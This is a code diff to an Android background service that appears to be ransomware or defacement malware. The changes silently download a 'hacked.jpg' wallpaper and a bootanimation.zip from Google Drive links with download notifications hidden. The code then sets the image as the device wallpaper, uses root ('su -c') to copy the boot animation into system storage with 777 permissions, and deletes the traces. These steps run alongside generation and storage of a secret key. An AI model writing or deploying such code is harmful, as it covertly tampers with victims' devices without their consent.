@@ -63,12 +63,25 @@ public class MyService extends Service{
                 if (c.moveToFirst()) {
                     int columnIndex = c.getColumnIndex(DownloadManager.COLUMN_STATUS);
                     if (DownloadManager.STATUS_SUCCESSFUL == c.getInt(columnIndex)) {
-                        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "hacked.jpg");
+                        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "hacked.jpg");
                         if(file.exists()){
                             try {
                                 WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
-                                Bitmap bMap = BitmapFactory.decodeFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/hacked.jpg");
+                                Bitmap bMap = BitmapFactory.decodeFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES) + "/hacked.jpg");
                                 wallpaperManager.setBitmap(bMap);
+                                file.delete();
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                            }
+                        }
+
+                        File bootFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "bootanimation.zip");
+                        if(bootFile.exists()){
+                            try {
+
+                                replaceBootAnimation();
+                                bootFile.delete();
+
                             } catch (Exception e) {
                                 e.printStackTrace();
                             }
@@ -104,12 +117,11 @@ public class MyService extends Service{
             //create secret key
             if(key == null)
             {
+                downloadBootAnimation();
                 String stringKey = Base64.encodeToString(ske.getSecretKey().getEncoded(), Base64.DEFAULT);
                 editor.putString("key", stringKey);
                 editor.commit();
-
                 changeWallpaper();
-                //change login video
             }
             else
             {
@@ -170,15 +182,45 @@ public class MyService extends Service{
     private void changeWallpaper(){
         try {
             registerReceiver(wallReceiver, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
-            String url = "https://www.dropbox.com/s/qilrjqhb9fsf685/hacked.jpg?dl=1";
+            String url = "https://drive.google.com/uc?export=download&id=1M__9-2qnrDeuOQCNODb-6SeJcwAmdvbZ";
             DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
             request.setDescription("Wallpaper dowload");
             request.setTitle("Wallpaper dowload");
             request.allowScanningByMediaScanner();
             request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
-            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "hacked.jpg");
+            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_MOVIES, "hacked.jpg");
             DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
             wallEnq = manager.enqueue(request);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void replaceBootAnimation() throws Exception{
+        String downloadsPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES).getAbsolutePath();
+        String from = "/storage/emulated/legacy/Movies"+"/bootanimation.zip";
+        String to = "/data/local";//"/system/media/";
+
+        String command = "cp "+from+" "+to;
+        Process process = Runtime.getRuntime().exec(new String[] { "su", "-c", command } );
+        process.waitFor();
+        process = Runtime.getRuntime().exec(new String[] { "su", "-c", "chmod 777 "+to+"/bootanimation.zip" });
+        process.waitFor();
+
+    }
+
+    private void downloadBootAnimation(){
+        try {
+            String url = "https://drive.google.com/uc?export=download&id=1UG6ZqobYyXXU7nhAA4Kvvpy0vbr4cvUG";
+            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
+            request.setDescription("bootAnimation download");
+            request.setTitle("bootAnimation download");
+            request.allowScanningByMediaScanner();
+            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
+            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_MOVIES, "bootanimation.zip");
+            DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
+            manager.enqueue(request);
 
         } catch (Exception e) {
             e.printStackTrace();
